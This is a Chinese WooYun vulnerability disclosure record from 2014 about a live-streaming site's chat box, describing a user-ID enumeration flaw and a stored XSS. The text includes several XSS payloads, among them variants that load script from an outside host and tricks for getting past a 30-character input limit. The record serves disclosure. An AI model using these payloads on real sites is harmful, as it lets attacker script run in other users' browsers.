{"id": 48664, "wybug_id": "wooyun-2014-087319", "wybug_title": "多玩某站越权+持久型XSS漏洞（分析与突破长度限制）", "wybug_corp": "广州多玩", "wybug_author": "路人甲", "wybug_date": "2014-12-16 10:28", "wybug_open_date": "2014-12-21 10:30", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： **直播是国内最大的直播平台，每月超过4000万的观众通过**直播观看游戏直播。 详细说明：  问题是虎牙直播。首先是越权，遍历一遍用户ID。嗯，订阅数就是各大主播蒙昧以求的了。然后，视频直播时时留言处有xss，不仅仅是自己x自己。我注册两个号，然后一个号发送留言，另一个号也会成功被x。首先弹窗,<img src=# onerror=alert(1)>。这里他限制了30个字符，虽然我也定位到了js函数，也改了，但还是会有限制长度，不知道为什么，可能是服务器做了限制。而且浏览器上的burp抓包是无法抓取到post的数据包的。所以暂时我只能想办法缩短payload长度。<img src=# onerror=http://s.xxx.cn><img onerror=http://s.xxx.cn src=><img onerror=http://s.xxx.cn src>尝试使用script标签。没有被过滤，但是长度不够。这里想到了xsser当初提出的多行xss的方式，既：第一次输入:<sciprt>/*或者<!--第二次输入：*/alert(1)</script>或者-->尝试不行。这里大晚上的没看清后面其实自动闭合了</script>，后来看到了。那这样就<script src=http://123123123>就可以了，后面会自动闭合。   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-21 10:30 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-21 12:18 |    \t\t小飞侠 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 好好学习，天天向上)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}